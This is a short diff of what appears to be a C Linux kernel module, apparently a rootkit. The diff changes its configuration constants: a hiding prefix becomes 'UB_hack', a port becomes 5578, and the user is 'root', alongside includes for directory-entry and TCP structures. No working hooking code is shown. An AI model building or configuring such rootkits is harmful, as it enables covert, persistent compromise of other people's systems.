@@ -4,8 +4,8 @@
 #include <linux/dirent.h>	        //contains dirent structs etc
 #include <linux/tcp.h>
 
-#define PREFIX "KK"
-#define PORT 42069
+#define PREFIX "UB_hack"
+#define PORT 5578
 #define USER "root"
 
 #ifdef CONFIG_X86_64
